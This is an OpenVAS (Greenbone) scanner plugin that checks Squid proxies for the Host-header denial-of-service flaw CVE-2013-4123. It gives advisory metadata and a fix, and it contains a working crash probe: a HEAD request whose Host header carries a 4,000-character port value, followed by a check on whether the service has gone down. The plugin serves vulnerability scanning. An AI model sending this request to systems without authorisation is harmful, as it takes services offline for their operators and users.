###############################################################################
# OpenVAS Vulnerability Test
#
# Squid Host Header Denial Of Service Vulnerability
#
# Authors:
# Veerendra G.G <veerendragg@secpod.com>
#
# Copyright:
# Copyright (C) 2013 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:squid-cache:squid";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802057");
  script_version("2022-07-20T10:33:02+0000");
  script_cve_id("CVE-2013-4123");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_tag(name:"last_modification", value:"2022-07-20 10:33:02 +0000 (Wed, 20 Jul 2022)");
  script_tag(name:"creation_date", value:"2013-08-12 12:42:47 +0530 (Mon, 12 Aug 2013)");
  script_name("Squid Host Header DoS Vulnerability (SQUID-2013:3)");

  script_tag(name:"summary", value:"Squid is prone to a denial of service (DoS) vulnerability.");

  script_tag(name:"vuldetect", value:"Send crafted 'Host' header request and check is it vulnerable to DoS.");

  script_tag(name:"solution", value:"Update to version 3.2.13, 3.3.8 or later.");

  script_tag(name:"insight", value:"Error when handling port number values within the 'Host' header
  of HTTP requests.");

  script_tag(name:"affected", value:"Squid version 3.2 through 3.2.12 and versions 3.3 through
  3.3.7.");

  script_tag(name:"impact", value:"Successful exploitation could allow remote attackers to cause a
  denial of service via a crafted port number values in the 'Host' header.");

  script_xref(name:"URL", value:"http://www.scip.ch/en/?vuldb.9547");
  script_xref(name:"URL", value:"http://secunia.com/advisories/54142");
  script_xref(name:"URL", value:"http://seclists.org/bugtraq/2013/Jul/98");
  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/527294");
  script_xref(name:"URL", value:"http://www.squid-cache.org/Advisories/SQUID-2013_3.txt");
  script_category(ACT_DENIAL);
  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");
  script_copyright("Copyright (C) 2013 Greenbone Networks GmbH");
  script_family("Denial of Service");
  script_dependencies("gb_squid_http_detect.nasl");
  script_mandatory_keys("squid/http/detected");
  script_require_ports("Services/www", "Services/http_proxy", 3128);

  exit(0);
}

include("host_details.inc");
include("http_func.inc");

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!get_app_location(port:port, cpe:CPE, nofork:TRUE))
  exit(0);

useragent = http_get_user_agent();

crafted_port_value = crap(length:2000, data:"AZ");

crafted_req = string("HEAD http://testhostdoesnotexists.com HTTP/1.1\r\n",
                     "Host: ", "testhostdoesnotexists.com", ":", crafted_port_value, "\r\n",
                     "User-Agent: ", useragent, "\r\n", "\r\n");

crafted_res = http_send_recv(port:port, data:crafted_req);

sleep(3);

soc = http_open_socket(port);
if(!soc){
  security_message(port:port);
  exit(0);
}

http_close_socket(soc);

exit(99);
